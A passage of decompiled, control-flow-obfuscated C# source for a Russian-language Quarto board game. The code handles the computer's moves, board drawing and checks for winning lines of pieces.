					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num4, num5]), num * size + 4, num8 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num2 = (int)((num3 * 157829772) ^ 0x5556CC91);
					continue;
				case 17u:
					num4 = 0;
					num2 = ((int)num3 * -1654168819) ^ 0x6F79593A;
					continue;
				case 16u:
				{
					int num10;
					int num11;
					if (!flag3)
					{
						num10 = -325126435;
						num11 = -325126435;
					}
					else
					{
						num10 = -564099262;
						num11 = -564099262;
					}
					num2 = num10 ^ ((int)num3 * -1248233132);
					continue;
				}
				case 15u:
					num2 = (int)(num3 * 815849647) ^ -1965934966;
					continue;
				case 14u:
					num2 = ((int)num3 * -890367442) ^ 0x71DC6CB6;
					continue;
				case 13u:
					Paint_Board();
					num2 = (int)((num3 * 469497628) ^ 0x55935DC);
					continue;
				case 12u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num2 = ((int)num3 * -1838977415) ^ -42040739;
					continue;
				case 11u:
					if (board[num8, num] == null)
					{
						num2 = -90500736;
						num9 = -90500736;
						continue;
					}
					goto IL_00b6;
				case 10u:
					num8 = Form1.smethod_39(e) / size;
					num2 = (int)(num3 * 649157592) ^ -1782632989;
					continue;
				case 9u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num2 = ((int)num3 * -1546702077) ^ -521279212;
					continue;
				case 8u:
					num2 = (int)((num3 * 1022847965) ^ 0x6C948220);
					continue;
				case 7u:
					num5 = 0;
					num2 = -470042924;
					continue;
				case 6u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num2 = ((int)num3 * -876467189) ^ 0x61C191B4;
					continue;
				case 4u:
				{
					int num6;
					int num7;
					if (flag)
					{
						num6 = 1663617392;
						num7 = 1663617392;
					}
					else
					{
						num6 = 1472525842;
						num7 = 1472525842;
					}
					num2 = num6 ^ ((int)num3 * -617431870);
					continue;
				}
				case 3u:
					num5++;
					num2 = -1351693580;
					continue;
				case 2u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num2 = ((int)num3 * -2063373101) ^ 0x4B7AAD25;
					continue;
				case 1u:
					flag = Form1.smethod_41((Control)(object)borderBox[num4, num5]) == Color.Blue;
					num2 = -1132108823;
					continue;
				case 0u:
					num2 = (int)((num3 * 1348841557) ^ 0x2712D5E7);
					continue;
				default:
					return;
				case 5u:
					break;
				case 28u:
					return;
					IL_00b6:
					num2 = -945977517;
					num9 = -945977517;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0554: Unknown result type (might be due to invalid IL or missing references)
		//IL_0582: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		int num17 = default(int);
		bool flag12 = default(bool);
		bool flag2 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		int num15 = default(int);
		int num14 = default(int);
		int num8 = default(int);
		int num5 = default(int);
		int num31 = default(int);
		Figurine[,] array2 = default(Figurine[,]);
		int num10 = default(int);
		int num9 = default(int);
		bool flag4 = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		bool flag9 = default(bool);
		Graphics graphics_ = default(Graphics);
		bool flag11 = default(bool);
		int num22 = default(int);
		bool flag8 = default(bool);
		int num41 = default(int);
		bool flag7 = default(bool);
		bool flag6 = default(bool);
		int num28 = default(int);
		bool flag = default(bool);
		int num29 = default(int);
		int num50 = default(int);
		int num23 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		int num11 = default(int);
		int num6 = default(int);
		bool flag3 = default(bool);
		int num42 = default(int);
		bool flag10 = default(bool);
		int num18 = default(int);
		int num30 = default(int);
		bool flag13 = default(bool);
		bool flag5 = default(bool);
		while (true)
		{
			int num = -1309531416;
			while (true)
			{
				uint num2;
				int num16;
				int num62;
				int num7;
				int num19;
				switch ((num2 = (uint)num ^ 0xA84F4E99u) % 168u)
				{
				case 167u:
					num17 = 0;
					num = ((int)num2 * -62181306) ^ 0x195BFC00;
					continue;
				case 166u:
					Paint_Board();
					num = (int)((num2 * 761773696) ^ 0x124436F4);
					continue;
				case 165u:
				{
					int num48;
					int num49;
					if (!flag12)
					{
						num48 = -918255870;
						num49 = -918255870;
					}
					else
					{
						num48 = -638307868;
						num49 = -638307868;
					}
					num = num48 ^ ((int)num2 * -1488026466);
					continue;
				}
				case 164u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -137530763) ^ -1572612179;
					continue;
				case 163u:
					flag2 = num17 < 4;
					num = -1978431740;
					continue;
				case 162u:
					array[num15, num14] = new Figurine(storage[num8, num5]);
					if (!Stop(array))
					{
						num = ((int)num2 * -744025519) ^ 0x2064059F;
						continue;
					}
					num16 = 1;
					goto IL_00da;
				case 161u:
					num31 = 0;
					num = -614686071;
					continue;
				case 160u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					array2[num10, num9] = new Figurine(storage[num8, num5]);
					num = ((int)num2 * -1941965277) ^ -1914488170;
					continue;
				case 159u:
				{
					int num36;
					if (num15 < 4)
					{
						num = -1096698264;
						num36 = -1096698264;
					}
					else
					{
						num = -875642006;
						num36 = -875642006;
					}
					continue;
				}
				case 158u:
					num = (int)(num2 * 1347225024) ^ -277223276;
					continue;
				case 157u:
				{
					int num20;
					int num21;
					if (flag2)
					{
						num20 = 28424701;
						num21 = 28424701;
					}
					else
					{
						num20 = 2035794157;
						num21 = 2035794157;
					}
					num = num20 ^ ((int)num2 * -879982983);
					continue;
				}
				case 156u:
					num16 = (Standoff(array) ? 1 : 0);
					goto IL_00da;
				case 155u:
					board[num15, num14] = new Figurine(storage[num8, num5]);
					num = ((int)num2 * -91745227) ^ -562183918;
					continue;
				case 153u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -1266505641;
					continue;
				case 152u:
					num = ((int)num2 * -348181639) ^ -1523147152;
					continue;
				case 151u:
				{
					int num58;
					int num59;
					if (!flag4)
					{
						num58 = 1098447048;
						num59 = 1098447048;
					}
					else
					{
						num58 = 469971390;
						num59 = 469971390;
					}
					num = num58 ^ ((int)num2 * -1695435843);
					continue;
				}
				case 150u:
					Form1.smethod_15(timer1);
					num = -1476276813;
					continue;
				case 149u:
					num9 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1632113976) ^ -1315744156;
					continue;
				case 148u:
					num8 = num3;
					num5 = num4;
					num = (int)((num2 * 2052560875) ^ 0x22AD427F);
					continue;
				case 147u:
					flag9 = array2[num17, num31] == null;
					num = -1110062391;
					continue;
				case 146u:
					num = (int)((num2 * 1491834106) ^ 0x58A50114);
					continue;
				case 145u:
					num15 = 0;
					num = (int)((num2 * 2134347974) ^ 0x22D5CC0);
					continue;
				case 144u:
					num = (int)(num2 * 350270406) ^ -1131432012;
					continue;
				case 143u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num14 + 0.05f) * (float)size, ((float)num15 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1146622159) ^ -1810635815;
					continue;
				case 142u:
					num = -606459340;
					continue;
				case 141u:
					Form1.smethod_5((Control)(object)borderBox[num8, num5], Color.White);
					num = (int)(num2 * 16780720) ^ -1231771920;
					continue;
				case 140u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1457154735) ^ 0x7D8AAEF;
					continue;
				case 139u:
				{
					int num45;
					int num46;
					if (!Form1.smethod_46((Control)(object)pictureBox1))
					{
						num45 = 1755297686;
						num46 = 1755297686;
					}
					else
					{
						num45 = 33791703;
						num46 = 33791703;
					}
					num = num45 ^ (int)(num2 * 496276558);
					continue;
				}
				case 138u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -990807936) ^ -427671637;
					continue;
				case 137u:
					flag11 = num22 < 4;
					num = -1802780682;
					continue;
				case 136u:
					flag8 = num41 < 4;
					num = -240239026;
					continue;
				case 135u:
					num = (int)((num2 * 553919482) ^ 0x5CDE2465);
					continue;
				case 134u:
					num = ((int)num2 * -1686593829) ^ 0x78BC8BF0;
					continue;
				case 133u:
				{
					int num37;
					int num38;
					if (!flag7)
					{
						num37 = 588821981;
						num38 = 588821981;
					}
					else
					{
						num37 = 768831042;
						num38 = 768831042;
					}
					num = num37 ^ ((int)num2 * -371957187);
					continue;
				}
				case 132u:
					flag6 = false;
					num = ((int)num2 * -1405719963) ^ 0x795AB9BE;
					continue;
				case 131u:
					num = ((int)num2 * -1654452194) ^ -1117691667;
					continue;
				case 130u:
					num = ((int)num2 * -1509424355) ^ 0x41BEBF93;
					continue;
				case 129u:
					num = ((int)num2 * -541721451) ^ 0x51FDAE47;
					continue;
				case 128u:
					num28++;
					num = ((int)num2 * -814265770) ^ -1860033902;
					continue;
				case 127u:
					num = -1367616229;
					continue;
				case 126u:
					num = -942553812;
					continue;
				case 125u:
					Form1.smethod_20(pictureBox[num8, num5], (Image)null);
					num = ((int)num2 * -1979108181) ^ -1230529391;
					continue;
				case 124u:
					flag4 = num14 < 4;
					num = -576381906;
					continue;
				case 123u:
					num = ((int)num2 * -842513168) ^ -2132154466;
					continue;
				case 122u:
				{
					int num12;
					int num13;
					if (flag)
					{
						num12 = -242808420;
						num13 = -242808420;
					}
					else
					{
						num12 = -781828935;
						num13 = -781828935;
					}
					num = num12 ^ ((int)num2 * -1748794457);
					continue;
				}
				case 121u:
				{
					int num63;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num29 * size + size / 2, (int)(((float)num22 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = -413056175;
						num63 = -413056175;
					}
					else
					{
						num = -2137886663;
						num63 = -2137886663;
					}
					continue;
				}
				case 120u:
					num50 = num22;
					num = ((int)num2 * -775169971) ^ -64387320;
					continue;
				case 119u:
					num = (int)((num2 * 1787021826) ^ 0x50ADD579);
					continue;
				case 118u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -818162328) ^ 0x137142F7;
					continue;
				case 117u:
					num = (int)((num2 * 559541743) ^ 0x64922DC4);
					continue;
				case 116u:
					if (!Standoff(board))
					{
						num = -82397346;
						num62 = -82397346;
						continue;
					}
					goto IL_0650;
				case 115u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -993530169) ^ -1293513531;
					continue;
				case 114u:
					num = ((int)num2 * -1389182804) ^ 0x7B174196;
					continue;
				case 113u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -568057055) ^ -789712027;
					continue;
				case 112u:
					num23 = 0;
					num = ((int)num2 * -1548858255) ^ 0x14912EDE;
					continue;
				case 111u:
					num = ((int)num2 * -2136070278) ^ -864051732;
					continue;
				case 110u:
					num = -71545444;
					continue;
				case 109u:
					array3[num17, num31] = new Figurine(storage[num11, num6]);
					flag3 = Stop(array3);
					num = (int)((num2 * 1534700072) ^ 0x21A32919);
					continue;
				case 108u:
				{
					int num61;
					if (num3 >= 4)
					{
						num = -157993825;
						num61 = -157993825;
					}
					else
					{
						num = -366280653;
						num61 = -366280653;
					}
					continue;
				}
				case 107u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 2100216883) ^ -1015614290;
					continue;
				case 106u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 942393924) ^ 0x5D0E889F);
					continue;
				case 105u:
					num4++;
					num = -145233914;
					continue;
				case 104u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array2);
					num = ((int)num2 * -1845121118) ^ 0x7BA7DB94;
					continue;
				case 103u:
					num = (int)(num2 * 1610400300) ^ -1366174820;
					continue;
				case 102u:
					num41 = 0;
					num = ((int)num2 * -196904758) ^ -960769943;
					continue;
				case 101u:
					num17++;
					num = ((int)num2 * -816585669) ^ 0x1EE3495D;
					continue;
				case 100u:
					num = (int)((num2 * 1684165070) ^ 0x69262225);
					continue;
				case 99u:
				{
					int num60;
					if (num28 < 4)
					{
						num = -1597088377;
						num60 = -1597088377;
					}
					else
					{
						num = -1314396743;
						num60 = -1314396743;
					}
					continue;
				}
				case 98u:
					Form1.smethod_30((Control)(object)borderBox[num22, num29]);
					num = (int)(num2 * 1766909269) ^ -119130944;
					continue;
				case 97u:
					Form1.smethod_30((Control)(object)borderBox[num8, num5]);
					num = ((int)num2 * -1804754834) ^ 0xE759A12;
					continue;
				case 96u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1223143209) ^ 0x320BF089;
					continue;
				case 95u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -1001986883) ^ -1079972792;
					continue;
				case 94u:
				{
					int num57;
					if (Standoff(board))
					{
						num = -1950910235;
						num57 = -1950910235;
					}
					else
					{
						num = -1568634625;
						num57 = -1568634625;
					}
					continue;
				}
				case 93u:
					flag12 = board[num10, num9] != null;
					num = ((int)num2 * -1103971333) ^ -707930309;
					continue;
				case 92u:
					num42 = 0;
					num22 = 0;
					num = (int)((num2 * 2028519130) ^ 0x643B0481);
					continue;
				case 91u:
				{
					int num55;
					int num56;
					if (!flag10)
					{
						num55 = -635280845;
						num56 = -635280845;
					}
					else
					{
						num55 = -640522485;
						num56 = -640522485;
					}
					num = num55 ^ ((int)num2 * -2022614287);
					continue;
				}
				case 90u:
					num4 = 0;
					num = -145233914;
					continue;
				case 89u:
					num = ((int)num2 * -73302923) ^ 0x28BF9107;
					continue;
				case 88u:
					num18++;
					num = (int)((num2 * 1232714264) ^ 0x42D23F65);
					continue;
				case 87u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)((num2 * 2130695425) ^ 0x5E5ACB49);
					continue;
				case 86u:
					Form1.smethod_47(1000);
					num = (int)(num2 * 1785125398) ^ -13626226;
					continue;
				case 85u:
					Form1.smethod_30((Control)(object)pictureBox[num22, num29]);
					num = ((int)num2 * -316493386) ^ 0x1A8A6B08;
					continue;
				case 84u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.LimeGreen);
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = (int)((num2 * 53272864) ^ 0x7138EBED);
					continue;
				case 83u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1945502100) ^ -595733036;
					continue;
				case 82u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num9 + 0.05f) * (float)size, ((float)num10 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 1788354217) ^ 0x2F1CAB50);
					continue;
				case 81u:
					num22++;
					num = (int)((num2 * 1947472264) ^ 0x4117A8);
					continue;
				case 80u:
					num = -1821984784;
					continue;
				case 79u:
					num30 = 0;
					num50 = 0;
					num = ((int)num2 * -997046165) ^ 0x4FBD2170;
					continue;
				case 78u:
					Form1.smethod_7((Control)(object)pictureBox[num41, num28], bool_0: true);
					num = -747739127;
					continue;
				case 77u:
					Form1.smethod_5((Control)(object)borderBox[num22, num29], Color.White);
					num = (int)((num2 * 1681289773) ^ 0x1DFDC3C4);
					continue;
				case 76u:
					num = ((int)num2 * -1362740265) ^ -173025835;
					continue;
				case 75u:
					Form1.smethod_20(pictureBox[num22, num29], (Image)null);
					num = ((int)num2 * -720783156) ^ -1391550931;
					continue;
				case 74u:
					Form1.smethod_5((Control)(object)borderBox[num8, num5], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num8, num5]);
					num = ((int)num2 * -351525326) ^ 0x7BAADE18;
					continue;
				case 73u:
					num29++;
					num = ((int)num2 * -125725168) ^ 0x5C6CAFDE;
					continue;
				case 72u:
				{
					int num53;
					int num54;
					if (!flag13)
					{
						num53 = -1204322111;
						num54 = -1204322111;
					}
					else
					{
						num53 = -1838685780;
						num54 = -1838685780;
					}
					num = num53 ^ (int)(num2 * 281373325);
					continue;
				}
				case 71u:
				{
					int num51;
					int num52;
					if (!flag11)
					{
						num51 = 1460262988;
						num52 = 1460262988;
					}
					else
					{
						num51 = 798867300;
						num52 = 798867300;
					}
					num = num51 ^ (int)(num2 * 2049941733);
					continue;
				}
				case 70u:
					board[num50, num42] = new Figurine(storage[num23, num30]);
					storage[num23, num30] = null;
					num = (int)(num2 * 1986814532) ^ -2076055017;
					continue;
				case 69u:
					num = (int)((num2 * 662447770) ^ 0x359E23AC);
					continue;
				case 68u:
					if (storage[num11, num6] != null)
					{
						num = (int)((num2 * 815916588) ^ 0x13686B44);
						continue;
					}
					num7 = 1;
					goto IL_0c9a;
				case 67u:
					num10 = Form1.smethod_33(rnd, 4);
					num = -867671604;
					continue;
				case 66u:
					num = (int)(num2 * 4553565) ^ -506501780;
					continue;
				case 65u:
					num14 = 0;
					num = -646067065;
					continue;
				case 64u:
					num41++;
					num = ((int)num2 * -1348112700) ^ 0x73DFD331;
					continue;
				case 63u:
				{
					int num47;
					if (num4 < 4)
					{
						num = -455170687;
						num47 = -455170687;
					}
					else
					{
						num = -253663705;
						num47 = -253663705;
					}
					continue;
				}
				case 62u:
					Form1.smethod_47(200);
					num = (int)(num2 * 1123586700) ^ -1087408850;
					continue;
				case 61u:
					num14++;
					num = -1540894739;
					continue;
				case 60u:
					num28 = 0;
					num = -568674574;
					continue;
				case 59u:
					num = -692544663;
					continue;
				case 58u:
				{
					int num43;
					int num44;
					if (Standoff(board))
					{
						num43 = -2018245592;
						num44 = -2018245592;
					}
					else
					{
						num43 = -1656126304;
						num44 = -1656126304;
					}
					num = num43 ^ (int)(num2 * 1314260600);
					continue;
				}
				case 57u:
					num42 = num29;
					num = (int)((num2 * 1941871750) ^ 0x44415337);
					continue;
				case 56u:
				{
					int num40;
					if (num31 < 4)
					{
						num = -1543660006;
						num40 = -1543660006;
					}
					else
					{
						num = -1905776780;
						num40 = -1905776780;
					}
					continue;
				}
				case 55u:
					flag10 = num29 < 4;
					num = -336213510;
					continue;
				case 54u:
					flag5 = Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Red;
					num = ((int)num2 * -1131404251) ^ -422902930;
					continue;
				case 53u:
					num = -690591962;
					continue;
				case 52u:
					Form1.smethod_20(pictureBox[num8, num5], (Image)null);
					num = (int)(num2 * 1170987315) ^ -976842092;
					continue;
				case 51u:
					num18 = 0;
					num = (int)(num2 * 14275171) ^ -1979138093;
					continue;
				case 50u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 1754924464) ^ 0x5A5D28EF);
					continue;
				case 49u:
				{
					int num39;
					if (!(Form1.smethod_41((Control)(object)borderBox[num22, num29]) == Color.Blue))
					{
						num = -867601528;
						num39 = -867601528;
					}
					else
					{
						num = -1141781753;
						num39 = -1141781753;
					}
					continue;
				}
				case 48u:
				{
					int num34;
					int num35;
					if (!flag9)
					{
						num34 = -1284862868;
						num35 = -1284862868;
					}
					else
					{
						num34 = -711675951;
						num35 = -711675951;
					}
					num = num34 ^ (int)(num2 * 2027863428);
					continue;
				}
				case 47u:
				{
					int num32;
					int num33;
					if (!flag8)
					{
						num32 = -1496629943;
						num33 = -1496629943;
					}
					else
					{
						num32 = -191514;
						num33 = -191514;
					}
					num = num32 ^ ((int)num2 * -1093590219);
					continue;
				}
				case 46u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 382930347) ^ -1754238148;
					continue;
				case 45u:
					num = ((int)num2 * -2083709177) ^ 0xF226CDE;
					continue;
				case 44u:
					flag7 = board[num15, num14] == null;
					num = -22663988;
					continue;
				case 43u:
					flag6 = true;
					num = ((int)num2 * -809238647) ^ -96496980;
					continue;
				case 42u:
					board[num10, num9] = new Figurine(storage[num8, num5]);
					num = ((int)num2 * -395406575) ^ 0x4F44B141;
					continue;
				case 41u:
					if (!flag6)
					{
						num = ((int)num2 * -1796524867) ^ 0xE9B620;
						continue;
					}
					goto IL_0fde;
				case 40u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 1710110369) ^ -1930998738;
					continue;
				case 39u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)((num2 * 1300135023) ^ 0x7BAE9F40);
					continue;
				case 38u:
					num29 = 0;
					num = -930742253;
					continue;
				case 37u:
					num31++;
					num = -614686071;
					continue;
				case 36u:
					storage[num8, num5] = null;
					num = ((int)num2 * -477208034) ^ -332442557;
					continue;
				case 35u:
					num30 = num29;
					num = (int)(num2 * 203119883) ^ -967340587;
					continue;
				case 34u:
					num = (int)(num2 * 154557692) ^ -226062337;
					continue;
				case 33u:
				{
					int num26;
					int num27;
					if (!flag5)
					{
						num26 = 863834034;
						num27 = 863834034;
					}
					else
					{
						num26 = 789012935;
						num27 = 789012935;
					}
					num = num26 ^ (int)(num2 * 664770306);
					continue;
				}
				case 32u:
				{
					int num24;
					int num25;
					if (!flag3)
					{
						num24 = 344464447;
						num25 = 344464447;
					}
					else
					{
						num24 = 1016306834;
						num25 = 1016306834;
					}
					num = num24 ^ (int)(num2 * 2070033461);
					continue;
				}
				case 31u:
					step++;
					num = ((int)num2 * -1372831429) ^ -2092185062;
					continue;
				case 30u:
					num3++;
					num = ((int)num2 * -298458878) ^ 0x11D246B1;
					continue;
				case 29u:
					num23 = num22;
					num = (int)(num2 * 784800112) ^ -111076342;
					continue;
				case 28u:
					if (num18 >= 9)
					{
						num = -165835597;
						num19 = -165835597;
						continue;
					}
					goto IL_0fde;
				case 27u:
					Form1.smethod_47(200);
					num = (int)(num2 * 1154132032) ^ -398881860;
					continue;
				case 26u:
					num15++;
					num = ((int)num2 * -1619793500) ^ 0x7F906FE;
					continue;
				case 25u:
					num = ((int)num2 * -1668923475) ^ -650525257;
					continue;
				case 24u:
					num = (int)((num2 * 862672350) ^ 0xA04B3A1);
					continue;
				case 23u:
					num = (int)(num2 * 1762778214) ^ -444136825;
					continue;
				case 22u:
					num = (int)((num2 * 94749812) ^ 0x3051F3A6);
					continue;
				case 21u:
					if (num11 == num8)
					{
						num = (int)(num2 * 856184631) ^ -1983934720;
						continue;
					}
					num7 = 0;
					goto IL_0c9a;
				case 20u:
					num = (int)(num2 * 1024363758) ^ -1014407301;
					continue;
				case 19u:
					Form1.smethod_30((Control)(object)borderBox[num11, num6]);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 1852479891) ^ 0x1335DE96);
					continue;
				case 18u:
					num11 = Form1.smethod_33(rnd, 4);
					num6 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -397759697) ^ -1544322925;
					continue;
				case 17u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num5]);
					num = (int)((num2 * 2133695505) ^ 0x694CA3A7);
					continue;
				case 16u:
					num = ((int)num2 * -1296449072) ^ -1987295719;
					continue;
				case 15u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num5]), num14 * size + 4, num15 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 1969879899) ^ -1752865955;
					continue;
				case 14u:
					num = (int)((num2 * 349687548) ^ 0x15B9F665);
					continue;
				case 13u:
					if (!Stop(board))
					{
						num = ((int)num2 * -723329412) ^ -1707795879;
						continue;
					}
					goto IL_0650;
				case 12u:
					num = (int)((num2 * 605452590) ^ 0x5F130325);
					continue;
				case 11u:
					num = ((int)num2 * -1763213278) ^ 0x64191CA4;
					continue;
				case 10u:
					storage[num8, num5] = null;
					Form1.smethod_5((Control)(object)borderBox[num11, num6], Color.Blue);
					num = (int)((num2 * 1244782725) ^ 0x56B50A8);
					continue;
				case 9u:
					num = ((int)num2 * -880400403) ^ -1761590355;
					continue;
				case 8u:
					num8 = 0;
					num = ((int)num2 * -1803271120) ^ -1774158056;
					continue;
				case 7u:
					num = (int)(num2 * 2128395930) ^ -660477016;
					continue;
				case 5u:
					num = -139157341;
					continue;
				case 4u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num5]);
					num = (int)((num2 * 254085730) ^ 0x24E4643);
					continue;
				case 3u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num5]), num9 * size + 4, num10 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 1076775174) ^ -1404121159;
					continue;
				case 2u:
					num7 = ((num6 == num5) ? 1 : 0);
					goto IL_0c9a;
				case 1u:
					num5 = 0;
					num3 = 0;
					num = ((int)num2 * -212956193) ^ -204545494;
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = -507579449;
					continue;
				default:
					return;
				case 154u:
					break;
				case 6u:
					return;
					IL_00da:
					flag = (byte)num16 != 0;
					num = -441611789;
					continue;
					IL_0fde:
					num = -1634826966;
					num19 = -1634826966;
					continue;
					IL_0c9a:
					flag13 = (byte)num7 != 0;
					num = -1857050143;
					continue;
					IL_0650:
					num = -2090691345;
					num62 = -2090691345;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num5 = default(int);
		bool flag = default(bool);
		bool result = default(bool);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 990857408;
			while (true)
			{
				uint num2;
				int num13;
				int num68;
				switch ((num2 = (uint)num ^ 0x3B3D059Eu) % 77u)
				{
				case 76u:
				{
					int num58;
					if (mem[num5, 0].Dark != mem[num5, 1].Dark)
					{
						num = 1311924502;
						num58 = 1311924502;
					}
					else
					{
						num = 1024126728;
						num58 = 1024126728;
					}
					continue;
				}
				case 75u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -1762950133) ^ 0x60847495;
						continue;
					}
					goto IL_005b;
				case 74u:
				{
					int num31;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = 1319373522;
						num31 = 1319373522;
					}
					else
					{
						num = 1929439921;
						num31 = 1929439921;
					}
					continue;
				}
				case 73u:
				{
					int num32;
					int num33;
					if (mem[1, num5].Point == mem[2, num5].Point)
					{
						num32 = 1210550671;
						num33 = 1210550671;
					}
					else
					{
						num32 = 109296449;
						num33 = 109296449;
					}
					num = num32 ^ ((int)num2 * -2004001421);
					continue;
				}
				case 72u:
				{
					int num6;
					if (mem[num5, 0].Square != mem[num5, 1].Square)
					{
						num = 1971955279;
						num6 = 1971955279;
					}
					else
					{
						num = 15944963;
						num6 = 15944963;
					}
					continue;
				}
				case 71u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
						num = ((int)num2 * -1538448354) ^ 0x509A82A1;
						continue;
					}
					goto IL_0157;
				case 70u:
				{
					int num41;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = 1748566107;
						num41 = 1748566107;
					}
					else
					{
						num = 703189869;
						num41 = 703189869;
					}
					continue;
				}
				case 69u:
				{
					int num23;
					int num24;
					if (mem[num5, 1].Square == mem[num5, 2].Square)
					{
						num23 = -1870142086;
						num24 = -1870142086;
					}
					else
					{
						num23 = -622098510;
						num24 = -622098510;
					}
					num = num23 ^ (int)(num2 * 74223841);
					continue;
				}
				case 68u:
				{
					int num63;
					int num64;
					if (mem[num5, 1].Dark == mem[num5, 2].Dark)
					{
						num63 = 892172918;
						num64 = 892172918;
					}
					else
					{
						num63 = 609814634;
						num64 = 609814634;
					}
					num = num63 ^ (int)(num2 * 1015680378);
					continue;
				}
				case 67u:
				{
					int num50;
					if (mem[num5, 0].Point != mem[num5, 1].Point)
					{
						num = 115173148;
						num50 = 115173148;
					}
					else
					{
						num = 1472179072;
						num50 = 1472179072;
					}
					continue;
				}
				case 66u:
				{
					int num51;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = 771313954;
						num51 = 771313954;
					}
					else
					{
						num = 117467331;
						num51 = 117467331;
					}
					continue;
				}
				case 64u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)(num2 * 2119543178) ^ -1804620412;
						continue;
					}
					goto IL_02c0;
				case 63u:
					flag = num5 < 4;
					num = 388152688;
					continue;
				case 62u:
				{
					int num11;
					int num12;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num11 = 1391472838;
						num12 = 1391472838;
					}
					else
					{
						num11 = 1979961259;
						num12 = 1979961259;
					}
					num = num11 ^ ((int)num2 * -1401866326);
					continue;
				}
				case 61u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1785523133) ^ 0x2BC2A0FB;
						continue;
					}
					goto IL_02c0;
				case 60u:
					if (mem[2, num5] != null)
					{
						num = ((int)num2 * -971269322) ^ -206688922;
						continue;
					}
					goto IL_014b;
				case 59u:
				{
					int num65;
					if (mem[0, num5].Point == mem[1, num5].Point)
					{
						num = 1585132055;
						num65 = 1585132055;
					}
					else
					{
						num = 1504644298;
						num65 = 1504644298;
					}
					continue;
				}
				case 58u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)((num2 * 831521529) ^ 0x7EAB84C5);
						continue;
					}
					goto IL_03cf;
				case 57u:
				{
					int num52;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = 651337093;
						num52 = 651337093;
					}
					else
					{
						num = 1998805966;
						num52 = 1998805966;
					}
					continue;
				}
				case 56u:
				{
					int num44;
					int num45;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num44 = -173639930;
						num45 = -173639930;
					}
					else
